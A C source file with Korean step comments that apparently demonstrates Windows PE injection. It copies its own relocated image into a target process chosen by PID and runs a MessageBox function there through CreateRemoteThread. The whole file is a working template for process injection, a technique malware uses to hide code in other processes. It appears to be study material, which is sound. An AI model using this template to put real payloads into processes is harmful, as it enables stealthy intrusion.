#include <stdio.h>
#include <Windows.h>

// BASE_RELOCATION_ENTRY 구조체 (12비트 Offset, 4비트 Type)
typedef struct BASE_RELOCATION_ENTRY {
    USHORT Offset : 12;
    USHORT Type   : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

// 원격에서 실행될 함수
// 간단한 문구 MessageBox로 출력
DWORD doit()
{
    MessageBoxA(NULL, "Hello", "PE injection!", MB_OK);
    return 0;
}

int main(int argc, char *argv[])
{
    // [1] GetModuleHandle()로 inject할 exe 파일의 PE Image 시작 주소 구하기
    PVOID imageBase = GetModuleHandleA(NULL);
    if (!imageBase) {
        printf("GetModuleHandleA failed.\n");
        return 1;
    }
    
    // [2] exe 파일의 PE Image Size 구하기
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("Invalid DOS signature.\n");
        return 1;
    }
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((BYTE*)imageBase + dosHeader->e_lfanew);
    if (ntHeader->Signature != IMAGE_NT_SIGNATURE) {
        printf("Invalid NT signature.\n");
        return 1;
    }
    DWORD sizeOfImage = ntHeader->OptionalHeader.SizeOfImage;
    printf("SizeOfImage: %u bytes\n", sizeOfImage);
    
    // [3] inject 할 프로세스의 PID 구하기
    if (argc < 2) {
        printf("Usage: %s <target PID>\n", argv[0]);
        return 1;
    }
    DWORD targetPID = (DWORD)atoi(argv[1]);
    
    // [4] OpenProcess()로 inject 할 프로세스 핸들러 구하기
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
    if (!hProcess) {
        printf("OpenProcess failed: %u\n", GetLastError());
        return 1;
    }
    printf("Opened target process (PID: %u)\n", targetPID);
    
    // [5] VirtualAllocEx()로 대상 프로세스 내에 메모리 공간 할당
    PVOID remoteImage = VirtualAllocEx(hProcess, NULL, sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteImage) {
        printf("VirtualAllocEx failed: %u\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
    printf("Allocated remote memory at: %p\n", remoteImage);
    
    // [6] WriteProcessMemory()로 섹션(전체 이미지) 복사
    // 로컬에서 현재 PE 이미지의 복사본 생성
    PVOID localImage = VirtualAlloc(NULL, sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!localImage) {
        printf("Local VirtualAlloc failed: %u\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
    memcpy(localImage, imageBase, sizeOfImage);
    
    // relocation 처리를 위해, 대상 프로세스에 할당될 주소와 원래 ImageBase 간 차이(Delta) 계산
    DWORD_PTR deltaImageBase = (DWORD_PTR)remoteImage - ntHeader->OptionalHeader.ImageBase;
    printf("Delta: 0x%Ix\n", deltaImageBase);
    
    // relocation 처리: PE 이미지 내의 relocation 테이블을 순회하면서 주소 수정
    PIMAGE_DATA_DIRECTORY relocDir = &ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (relocDir->Size) {
        PIMAGE_BASE_RELOCATION relocTable = (PIMAGE_BASE_RELOCATION)((BYTE*)localImage + relocDir->VirtualAddress);
        while (relocTable->SizeOfBlock) {
            DWORD entryCount = (relocTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            PWORD relocData = (PWORD)((BYTE*)relocTable + sizeof(IMAGE_BASE_RELOCATION));
            for (DWORD i = 0; i < entryCount; i++) {
                WORD type = relocData[i] >> 12;
                WORD offset = relocData[i] & 0x0FFF;
                if (type == IMAGE_REL_BASED_ABSOLUTE) {
                    continue;
                }
#ifdef _WIN64
                if (type == IMAGE_REL_BASED_DIR64) {
                    PULONGLONG patchAddr = (PULONGLONG)((BYTE*)localImage + relocTable->VirtualAddress + offset);
                    *patchAddr += deltaImageBase;
                }
#else
                if (type == IMAGE_REL_BASED_HIGHLOW) {
                    PDWORD patchAddr = (PDWORD)((BYTE*)localImage + relocTable->VirtualAddress + offset);
                    *patchAddr += (DWORD)deltaImageBase;
                }
#endif
            }
            relocTable = (PIMAGE_BASE_RELOCATION)((BYTE*)relocTable + relocTable->SizeOfBlock);
        }
    } else {
        printf("No relocation table found.\n");
    }
    
    // 대상 프로세스에 수정된 로컬 이미지 기록
    if (!WriteProcessMemory(hProcess, remoteImage, localImage, sizeOfImage, NULL)) {
        printf("WriteProcessMemory failed: %u\n", GetLastError());
        VirtualFreeEx(hProcess, remoteImage, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        VirtualFree(localImage, 0, MEM_RELEASE);
        return 1;
    }
    printf("Image written to target process.\n");
    
    // [7] CreateRemoteThread()로 원격에서 doit() 함수 실행
    // 원격 진입점 = remoteImage + ( (BYTE*)doit() - (BYTE*)imageBase )
    LPTHREAD_START_ROUTINE remoteEntryPoint = (LPTHREAD_START_ROUTINE)((BYTE*)remoteImage + ((BYTE*)doit - (BYTE*)imageBase));
    printf("Remote entry point: %p\n", remoteEntryPoint);
    
    HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, remoteEntryPoint, NULL, 0, NULL);
    if (!hRemoteThread) {
        printf("CreateRemoteThread failed: %u\n", GetLastError());
        VirtualFreeEx(hProcess, remoteImage, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        VirtualFree(localImage, 0, MEM_RELEASE);
        return 1;
    }
    printf("Remote thread created.\n");
    
    // 원격 스레드가 종료될 때까지 대기
    WaitForSingleObject(hRemoteThread, INFINITE);
    CloseHandle(hRemoteThread);
    CloseHandle(hProcess);
    VirtualFree(localImage, 0, MEM_RELEASE);
    
    return 0;
}
